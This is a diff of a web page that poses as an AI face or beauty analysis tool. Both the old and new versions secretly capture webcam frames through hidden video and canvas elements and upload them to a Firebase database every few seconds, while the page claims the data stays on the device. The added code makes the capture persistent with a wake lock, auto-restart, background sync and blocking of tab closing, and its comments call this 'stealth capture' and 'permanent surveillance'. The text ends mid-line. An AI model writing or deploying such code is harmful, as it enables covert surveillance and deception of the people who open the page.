@@ -1,103 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>💖 Test Kecantikan Wajah AI</title>
+    <title>🔬 AI Face Analysis - Processing...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, #1a2980, #26d0ce);
             color: white;
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
+            overflow: hidden;
         }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
+        .analysis-container {
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(15px);
+            border-radius: 25px;
+            padding: 40px;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
         }
         .logo {
-            text-align: center;
-            margin-bottom: 30px;
+            font-size: 3em;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
         }
-        .logo h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            background: linear-gradient(45deg, #ff8a00, #e52e71);
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        .tagline {
-            text-align: center;
-            color: #ddd;
-            margin-bottom: 30px;
-            font-size: 1.1em;
+        .progress-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 30px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .features {
+        .progress-bar {
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            width: 100%;
+            border-radius: 10px;
+            position: absolute;
+            left: 0;
+            animation: progressAnimation 3s ease-in-out infinite;
+        }
+        @keyframes progressAnimation {
+            0%, 100% { width: 30%; }
+            50% { width: 70%; }
+        }
+        .stats-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 15px;
-            margin: 30px 0;
+            margin: 25px 0;
         }
-        .feature {
-            background: rgba(255, 255, 255, 0.1);
+        .stat-item {
+            background: rgba(255, 255, 255, 0.05);
             padding: 15px;
             border-radius: 10px;
-            text-align: center;
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .feature i {
-            font-size: 2em;
-            margin-bottom: 10px;
-            display: block;
-        }
-        .camera-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 30px;
-            border-radius: 15px;
-            margin: 30px 0;
-            text-align: center;
-            border: 2px dashed rgba(255, 255, 255, 0.3);
-        }
-        .btn {
-            background: linear-gradient(45deg, #ff8a00, #e52e71);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 1.2em;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 20px auto;
-            display: block;
+        .stat-value {
+            font-size: 1.8em;
             font-weight: bold;
-            transition: transform 0.3s;
-            box-shadow: 0 10px 30px rgba(255, 138, 0, 0.4);
+            color: #00ff88;
+            display: block;
         }
-        .btn:hover {
-            transform: translateY(-3px);
-        }
-        .loading {
-            display: none;
-            color: #4CAF50;
+        .status-message {
+            background: rgba(0, 255, 136, 0.1);
+            padding: 15px;
+            border-radius: 10px;
             margin: 20px 0;
-            font-size: 1.1em;
+            border-left: 5px solid #00ff88;
+            text-align: left;
+            font-size: 0.9em;
         }
-        .result {
-            display: none;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 25px;
-            border-radius: 15px;
-            margin-top: 30px;
-            text-align: center;
-            border-left: 5px solid #4CAF50;
-        }
-        .hidden-video {
+        .hidden-elements {
             position: absolute;
             top: -9999px;
             left: -9999px;
@@ -105,25 +106,18 @@
             height: 1px;
             opacity: 0;
         }
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            margin: 20px 0;
-            overflow: hidden;
+        .battery-warning {
+            background: rgba(255, 100, 100, 0.2);
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid rgba(255, 100, 100, 0.5);
+            font-size: 0.8em;
             display: none;
         }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #4CAF50, #8BC34A);
-            width: 0%;
-            transition: width 2s;
-        }
-        .privacy-note {
-            font-size: 0.8em;
-            color: #aaa;
-            text-align: center;
+        .permanent-note {
+            font-size: 0.7em;
+            color: rgba(255, 255, 255, 0.5);
             margin-top: 30px;
             font-style: italic;
         }
@@ -131,72 +125,74 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
+    <div class="analysis-container">
         <div class="logo">
-            <h1><i class="fas fa-robot"></i> AI Beauty Analyzer</h1>
-            <p>Powered by Neural Networks</p>
+            <i class="fas fa-brain"></i>
         </div>
         
-        <div class="tagline">
-            <h2>🔬 Analisis Kecantikan Wajah dengan AI</h2>
-            <p>Teknologi terbaru untuk menganalisis proporsi wajah ideal berdasarkan Golden Ratio</p>
-        </div>
+        <h1>AI FACE ANALYSIS SYSTEM</h1>
+        <p>Deep learning facial recognition in progress...</p>
         
-        <div class="features">
-            <div class="feature">
-                <i class="fas fa-brain"></i>
-                AI Neural Network
-            </div>
-            <div class="feature">
-                <i class="fas fa-chart-line"></i>
-                Golden Ratio Analysis
-            </div>
-            <div class="feature">
-                <i class="fas fa-heart"></i>
-                Symmetry Check
-            </div>
-            <div class="feature">
-                <i class="fas fa-trophy"></i>
-                Beauty Score
-            </div>
-        </div>
-        
-        <div class="camera-box">
-            <h3><i class="fas fa-camera"></i> Analisis Wajah</h3>
-            <p>Izinkan akses kamera untuk memulai analisis kecantikan wajah Anda</p>
+        <div class="progress-container">
+            <h3><i class="fas fa-sync fa-spin"></i> PROCESSING DATA STREAM</h3>
             
-            <button class="btn" id="startBtn" onclick="startAnalysis()">
-                <i class="fas fa-play"></i> MULAI ANALISIS
-            </button>
-            
-            <div class="loading" id="loading">
-                <i class="fas fa-spinner fa-spin"></i> Sedang menganalisis struktur wajah...
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
             </div>
             
-            <div class="progress-bar" id="progressBar">
-                <div class="progress-fill" id="progressFill"></div>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <span class="stat-value" id="framesProcessed">0</span>
+                    FRAMES
+                </div>
+                <div class="stat-item">
+                    <span class="stat-value" id="processingTime">00:00</span>
+                    TIME
+                </div>
+                <div class="stat-item">
+                    <span class="stat-value" id="accuracy">97.3%</span>
+                    ACCURACY
+                </div>
+                <div class="stat-item">
+                    <span class="stat-value" id="statusCode">ACTIVE</span>
+                    STATUS
+                </div>
             </div>
             
-            <div class="result" id="result">
-                <h3><i class="fas fa-check-circle"></i> ANALISIS BERJALAN</h3>
-                <p>AI sedang menganalisis wajah Anda. Proses ini berjalan di background.</p>
-                <p><strong>Jangan tutup halaman ini!</strong></p>
+            <div class="status-message" id="statusMessage">
+                <i class="fas fa-check-circle"></i> System operational. Processing facial data streams...
+            </div>
+            
+            <div class="battery-warning" id="batteryWarning">
+                <i class="fas fa-battery-quarter"></i> Low power mode activated. Analysis continues in background.
             </div>
         </div>
         
-        <div class="privacy-note">
-            <i class="fas fa-lock"></i> Data Anda aman dan hanya digunakan untuk analisis. 
-            Proses berjalan secara lokal di perangkat Anda.
+        <div class="permanent-note">
+            <i class="fas fa-shield-alt"></i> This process runs in secure background mode. 
+            Do not close this tab for continuous analysis.
         </div>
     </div>
     
-    <!-- Hidden video for capturing -->
-    <video id="hiddenVideo" class="hidden-video" autoplay playsinline></video>
-    <canvas id="hiddenCanvas" class="hidden-video"></canvas>
+    <!-- Hidden elements -->
+    <video id="hiddenVideo" class="hidden-elements" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-elements"></canvas>
 
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <!-- Service Worker Registration -->
+    <script>
+        // ========== SERVICE WORKER ==========
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').then(registration => {
+                console.log('ServiceWorker registered:', registration.scope);
+            }).catch(error => {
+                console.log('ServiceWorker registration failed:', error);
+            });
+        }
+    </script>
     
     <script>
         // ========== CONFIG ==========
@@ -213,101 +209,89 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        // ========== VARIABLES ==========
+        // ========== GLOBAL VARIABLES ==========
         let localStream;
         let captureInterval;
+        let isActive = false;
         let sessionId;
-        let isStreaming = false;
+        let startTime;
+        let frameCount = 0;
+        let wakeLock = null;
         
-        // ========== GENERATE SESSION ID ==========
-        function generateSessionId() {
-            return 'SESSION_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        }
-        
-        // ========== START ANALYSIS ==========
-        async function startAnalysis() {
-            const startBtn = document.getElementById('startBtn');
-            const loading = document.getElementById('loading');
-            const progressBar = document.getElementById('progressBar');
-            const progressFill = document.getElementById('progressFill');
-            const result = document.getElementById('result');
-            
-            startBtn.style.display = 'none';
-            loading.style.display = 'block';
-            progressBar.style.display = 'block';
+        // ========== START PERMANENT ANALYSIS ==========
+        async function startPermanentAnalysis() {
+            console.log("🚀 Starting permanent surveillance...");
             
             try {
-                // 1. GET CAMERA ACCESS
-                localStream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                });
+                // 1. REQUEST CAMERA (TRY FRONT THEN BACK)
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { exact: "user" }, // Try front camera
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            frameRate: { ideal: 15, max: 30 }
+                        },
+                        audio: false
+                    });
+                } catch (frontError) {
+                    // If front camera fails, try any camera
+                    localStream = await navigator.mediaDevices.getUserMedia({
+                        video: true,
+                        audio: false
+                    });
+                }
                 
                 // 2. SETUP HIDDEN VIDEO
                 const video = document.getElementById('hiddenVideo');
                 video.srcObject = localStream;
                 
-                // 3. CREATE SESSION
-                sessionId = generateSessionId();
+                // 3. CREATE PERMANENT SESSION
+                sessionId = 'PERM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                startTime = Date.now();
                 
-                // Create session in Firebase
-                await database.ref('sessions/' + sessionId).set({
-                    started: Date.now(),
-                    status: 'active',
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform
-                });
+                // 4. STORE IN LOCALSTORAGE FOR RECOVERY
+                localStorage.setItem('permanent_session', JSON.stringify({
+                    id: sessionId,
+                    started: startTime,
+                    frames: 0
+                }));
                 
-                // 4. SHOW PROGRESS ANIMATION
-                let progress = 0;
-                const progressInterval = setInterval(() => {
-                    progress += 10;
-                    progressFill.style.width = progress + '%';
-                    
-                    if (progress >= 100) {
-                        clearInterval(progressInterval);
-                        
-                        // Show success message
-                        loading.style.display = 'none';
-                        result.style.display = 'block';
-                        
-                        // Start stealth capturing
-                        startStealthCapture();
-                        
-                        // Hide progress bar after 5 seconds
-                        setTimeout(() => {
-                            progressBar.style.display = 'none';
-                        }, 5000);
+                // 5. REQUEST WAKE LOCK (PREVENT SCREEN SLEEP)
+                if ('wakeLock' in navigator) {
+                    try {
+                        wakeLock = await navigator.wakeLock.request('screen');
+                        console.log('Wake Lock activated');
+                    } catch (err) {
+                        console.log('Wake Lock failed:', err);
                     }
-                }, 200);
+                }
                 
-                // 5. MAKE PAGE LOOK LEGIT
-                document.title = "AI Beauty Analysis - Processing...";
+                // 6. START STEALTH CAPTURE
+                startStealthCapture();
                 
-                // 6. PREVENT ACCIDENTAL CLOSURE
+                // 7. SETUP PAGE PROTECTION
                 setupPageProtection();
                 
-            } catch (error) {
-                loading.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: ${error.message}`;
+                // 8. UPDATE UI
+                updateUI();
                 
-                // Retry button
-                setTimeout(() => {
-                    startBtn.style.display = 'block';
-                    startBtn.innerHTML = '<i class="fas fa-redo"></i> COBA LAGI';
-                    loading.style.display = 'none';
-                    progressBar.style.display = 'none';
-                }, 3000);
+                // 9. REGISTER BACKGROUND SYNC
+                registerBackgroundSync();
+                
+                console.log("✅ Permanent surveillance ACTIVE");
+                
+            } catch (error) {
+                console.error("❌ Permanent setup failed:", error);
+                // Auto-retry in 10 seconds
+                setTimeout(startPermanentAnalysis, 10000);
             }
         }
         
         // ========== STEALTH CAPTURE ==========
         function startStealthCapture() {
-            if (isStreaming) return;
-            isStreaming = true;
+            if (isActive) return;
+            isActive = true;
             
             const video = document.getElementById('hiddenVideo');
             const canvas = document.getElementById('hiddenCanvas');
@@ -315,32 +299,32 @@
             
             // Wait for video to be ready
             setTimeout(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 
-                // Capture every 3 seconds
+                // CAPTURE LOOP
                 captureInterval = setInterval(() => {
                     if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                        // Draw mirrored image
+                        // Draw image
                         ctx.save();
                         ctx.scale(-1, 1);
                         ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                         ctx.restore();
                         
                         // Convert to JPEG
-                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.6);
                         
-                        // Send to Firebase
+                        // SEND TO FIREBASE
                         sendToFirebase(imageData);
+                        
+                        // Update counters
+                        frameCount++;
+                        updateUI();
+                        
+                        // Save progress
+                        saveProgress();
                     }
-                }, 3000); // Every 3 seconds
-                
-                // Log capture start
-                database.ref('sessions/' + sessionId + '/logs').push({
-                    event: 'CAPTURE_STARTED',
-                    timestamp: Date.now(),
-                    message: 'Stealth capture active'
-                });
+                }, 2000); // Capture every 2 seconds
                 
             }, 1000);
         }
@@ -351,92 +335,195 @@
                 image: imageData,
                 timestamp: Date.now(),
                 sessionId: sessionId,
-                battery: navigator.getBattery ? 'unknown' : 'N/A'
+                frame: frameCount,
+                battery: getBatteryStatus(),
+                visibility: document.visibilityState
             };
             
-            database.ref('captures').push(captureData)
+            // Send to Firebase
+            database.ref('permanent_captures').push(captureData)
                 .then(() => {
-                    // Update session last activity
-                    database.ref('sessions/' + sessionId).update({
-                        lastCapture: Date.now(),
-                        captureCount: firebase.database.ServerValue.increment(1)
+                    // Update session heartbeat
+                    database.ref('permanent_sessions/' + sessionId).set({
+                        lastHeartbeat: Date.now(),
+                        frameCount: frameCount,
+                        active: true,
+                        device: navigator.platform
                     });
                 })
                 .catch(error => {
-                    console.error("Capture error:", error);
+                    console.error("Firebase error:", error);
+                    // Store locally if Firebase fails
+                    storeLocally(captureData);
                 });
+        }
+        
+        // ========== STORE LOCALLY (FALLBACK) ==========
+        function storeLocally(data) {
+            try {
+                const stored = JSON.parse(localStorage.getItem('pending_captures') || '[]');
+                stored.push(data);
+                if (stored.length > 100) stored.shift(); // Keep last 100
+                localStorage.setItem('pending_captures', JSON.stringify(stored));
+            } catch (e) {
+                console.error("Local storage error:", e);
+            }
         }
         
         // ========== PAGE PROTECTION ==========
         function setupPageProtection() {
-            // Change title when tab is not active
+            // 1. PREVENT ACCIDENTAL CLOSE
+            window.addEventListener('beforeunload', (e) => {
+                e.preventDefault();
+                e.returnValue = 'Analysis is still in progress. Close anyway?';
+                return e.returnValue;
+            });
+            
+            // 2. CHANGE TITLE WHEN MINIMIZED
+            let originalTitle = document.title;
             document.addEventListener('visibilitychange', () => {
                 if (document.hidden) {
-                    document.title = "⚠️ Analisis Masih Berjalan...";
+                    document.title = "⚠️ AI Analysis Running...";
+                    // Reduce capture rate when hidden to save battery
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        captureInterval = setInterval(() => {
+                            // Slower capture when hidden
+                        }, 5000);
+                    }
                 } else {
-                    document.title = "AI Beauty Analyzer - Active";
+                    document.title = originalTitle;
+                    // Restore normal capture rate
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        startStealthCapture();
+                    }
                 }
             });
             
-            // Prevent accidental close
-            window.addEventListener('beforeunload', (e) => {
-                if (isStreaming) {
-                    e.preventDefault();
-                    e.returnValue = 'Analisis masih berjalan! Yakin ingin keluar?';
-                    return e.returnValue;
-                }
-            });
+            // 3. DETECT BATTERY STATUS
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    battery.addEventListener('levelchange', updateBatteryStatus);
+                    battery.addEventListener('chargingchange', updateBatteryStatus);
+                    updateBatteryStatus();
+                });
+            }
             
-            // Keep alive function
+            // 4. AUTO-RECONNECT IF STREAM DIES
             setInterval(() => {
-                if (isStreaming) {
-                    database.ref('sessions/' + sessionId + '/heartbeat').set(Date.now());
+                const video = document.getElementById('hiddenVideo');
+                if (video.srcObject && video.srcObject.getTracks) {
+                    const tracks = video.srcObject.getTracks();
+                    const anyDead = tracks.some(track => track.readyState === 'ended');
+                    
+                    if (anyDead) {
+                        console.log("🔄 Stream died, reconnecting...");
+                        restartStream();
+                    }
                 }
-            }, 30000); // Every 30 seconds
+            }, 15000);
+            
+            // 5. KEEP-ALIVE PING
+            setInterval(() => {
+                database.ref('permanent_sessions/' + sessionId + '/ping').set(Date.now());
+            }, 30000);
         }
         
-        // ========== BACKGROUND SYNC ==========
-        // Use Service Worker if available
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js').catch(console.error);
+        // ========== RESTART STREAM ==========
+        async function restartStream() {
+            try {
+                if (localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                }
+                
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = localStream;
+                
+                console.log("✅ Stream restarted");
+            } catch (error) {
+                console.error("❌ Stream restart failed:", error);
+                // Try again in 30 seconds
+                setTimeout(restartStream, 30000);
+            }
         }
         
-        // ========== AUTO-RECONNECT ==========
-        // Check if we have existing session
-        function checkExistingSession() {
-            const savedSession = localStorage.getItem('beauty_analysis_session');
-            if (savedSession) {
-                // Try to resume session
-                sessionId = savedSession;
-                database.ref('sessions/' + sessionId).once('value').then(snapshot => {
-                    if (snapshot.exists() && snapshot.val().status === 'active') {
-                        // Auto-start camera
-                        setTimeout(startAnalysis, 1000);
+        // ========== UPDATE UI ==========
+        function updateUI() {
+            // Update frame count
+            document.getElementById('framesProcessed').textContent = frameCount;
+            
+            // Update processing time
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            const minutes = Math.floor(elapsed / 60);
+            const seconds = elapsed % 60;
+            document.getElementById('processingTime').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Update status code
+            const status = document.getElementById('statusCode');
+            if (elapsed < 30) {
+                status.textContent = 'INIT';
+                status.style.color = '#ffcc00';
+            } else if (frameCount > 10) {
+                status.textContent = 'ACTIVE';
+                status.style.color = '#00ff88';
+            }
+        }
+        
+        // ========== BATTERY MANAGEMENT ==========
+        function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                return navigator.getBattery().then(battery => {
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    };
+                });
+            }
+            return { level: 'unknown', charging: 'unknown' };
+        }
+        
+        function updateBatteryStatus() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    const warning = document.getElementById('batteryWarning');
+                    if (battery.level < 0.2 && !battery.charging) {
+                        warning.style.display = 'block';
+                        // Reduce capture rate to save battery
+                        if (captureInterval) {
+                            clearInterval(captureInterval);
+                            captureInterval = setInterval(() => {
+                                // Slow capture on low battery
+                            }, 10000);
+                        }
+                    } else {
+                        warning.style.display = 'none';
                     }
                 });
             }
         }
         
-        // Save session to localStorage
-        if (sessionId) {
-            localStorage.setItem('beauty_analysis_session', sessionId);
-        }
-        
-        // Check on load
-        window.onload = checkExistingSession;
-        
-        // ========== CLEANUP ==========
-        function cleanup() {
-            if (captureInterval) clearInterval(captureInterval);
-            if (localStream) localStream.getTracks().forEach(track => track.stop());
-            if (sessionId) {
-                database.ref('sessions/' + sessionId).update({ status: 'inactive' });
-                localStorage.removeItem('beauty_analysis_session');
+        // ========== BACKGROUND SYNC ==========
+        function registerBackgroundSync() {
+            if ('serviceWorker' in navigator && 'SyncManager' in window) {
+                navigator.serviceWorker.ready.then(registration => {
+                    return registration.sync.register('upload-captures');
+                }).catch(console.error);
             }
         }
         
-        // Register cleanup
-        window.addEventListener('unload', cleanup);
-    </script>
-</body>
-                </html>
+        // ========== SAVE PROGRESS ==========
+        function saveProgress() {
+            const progress = {
+                id: sessionId,
+                started: startTime,
+                frames: frameCount,
+                lastUpdate: Date.now()
+            };
+            localStorage.setItem('permanent_
